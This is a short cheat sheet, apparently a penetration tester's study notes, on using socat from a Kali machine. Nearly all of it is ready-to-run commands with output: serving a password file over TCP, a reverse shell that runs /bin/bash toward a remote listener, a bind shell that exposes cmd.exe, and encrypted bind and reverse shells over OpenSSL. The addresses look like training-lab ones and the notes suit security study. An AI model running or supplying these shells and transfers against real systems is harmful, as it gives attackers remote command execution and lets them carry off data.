---
Description: Socat is a command line based utility that establishes two bidirectional byte streams and transfers data between them.
URL: https://linux.die.net/man/1/socat
---

### Traditional usage

```bash
kali@kali:~$ socat - TCP4:<remote server ip address>:80     # nc <remote server's ip address> 80
kali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT              # sudo nc -lvp localhost 443

```

### File transfer

```bash
# Command to serve a file
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt				# Server
# Command to download a file  
kali@kali:~$ socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create		# Client
```

### Reverse shell

```bash
kali@kali:~$ socat -d -d TCP4-LISTEN:443 STDOUT      									# Server
... socat\[4388\] N listening on AF=2 0.0.0.0:443

kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash  									# Client - Reverse shell 
... socat\[4388\] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443  
... socat\[4388\] N using stdout for reading and writing  
... socat\[4388\] N starting data transfer loop with FDs \[4,4\] and \[1,1\]  
$whoami  
kali  
$id  
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

### Bind shell

```powershell
c:\Tools\practical_tools>socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes				# Server - Bind Shell

kali@kali:~$ socat - TCP4:10.11.0.4:443													# Client
```

### Encrypted Bind Shell

```bash
kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash     # Server - Encrypted Bind Shell

kali@kali:~$ socat - OPENSSL:10.11.0.4:443,verify=0  											# Client
$id  
uid=1000(kali) gid=1000(kali) groups=1000(kali)  
$whoami  
kali
```

### Encrypted Reverse Shell

```bash
$ sudo socat -d -d OPENSSL-LISTEN:443,cert=finalCert.pem,verify=0,fork STDOUT				# Server

c:\Tools\practical_tools>socat OPENSSL:192.168.119.209:443,verify=0 EXEC:'cmd.exe',pipes	# Client - Encrypted Reverse Shell
```